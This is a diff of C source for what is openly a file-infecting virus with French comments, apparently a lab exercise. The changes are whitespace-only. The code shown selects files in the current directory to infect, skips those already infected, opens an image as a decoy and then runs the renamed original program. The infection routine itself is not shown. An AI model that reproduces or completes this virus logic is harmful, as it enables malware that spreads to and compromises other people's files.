@@ -43,11 +43,9 @@ char **searchFiles(const char *virusName) {
     // Ouverture du répertoire courant "."
     DIR *rep = opendir(".");
 
-
     struct dirent *lecture; 
     struct stat buf;        
 
-    
     while ((lecture = readdir(rep)) != NULL && cpt < MAX_FILES) {
 
         // Récupère les infos du fichier dans buf
@@ -62,7 +60,7 @@ char **searchFiles(const char *virusName) {
             if (strcmp(lecture->d_name, virusName) == 0) {
                 continue;
             }
-
+            
             // Exclure les déjà infectés
             if (dejaInfecte(lecture->d_name)) {
                 continue;
@@ -123,8 +121,6 @@ void infecte(char **files, const char *cheminVirus) {
 // Rend service à l'utilisateur et transfère l'exécution :
 void execution(const char *arg) {
 
-   
-   
     char *slash = strrchr(arg, '/'); 
     char *base;
 
@@ -146,17 +142,17 @@ void execution(const char *arg) {
             while ((dir = readdir(d)) != NULL) {
 
                 
-                int estImage = 0;
-                if (strstr(dir->d_name, ".jpg")  != NULL) estImage = 1;
-                if (strstr(dir->d_name, ".jpeg") != NULL) estImage = 1;
-                if (strstr(dir->d_name, ".png")  != NULL) estImage = 1;
-                if (strstr(dir->d_name, ".bmp")  != NULL) estImage = 1;
+            int estImage = 0;
+            if (strstr(dir->d_name, ".jpg")  != NULL) estImage = 1;
+            if (strstr(dir->d_name, ".jpeg") != NULL) estImage = 1;
+            if (strstr(dir->d_name, ".png")  != NULL) estImage = 1;
+            if (strstr(dir->d_name, ".bmp")  != NULL) estImage = 1;
 
                 
-                if (estImage && strstr(dir->d_name, ".old") == NULL) {
+            if (estImage && strstr(dir->d_name, ".old") == NULL) {
                     char cmd[512];
                     snprintf(cmd, sizeof(cmd),
-                             "xdg-open \"../imgaes/%s\" > /dev/null 2>&1", dir->d_name);
+                      "xdg-open \"../imgaes/%s\" > /dev/null 2>&1", dir->d_name);
                     system(cmd);
                     break; 
                 }
@@ -172,7 +168,6 @@ void execution(const char *arg) {
         system(progOld);
     }
 }
-
 
 
 int main(int argc, char *argv[]) {
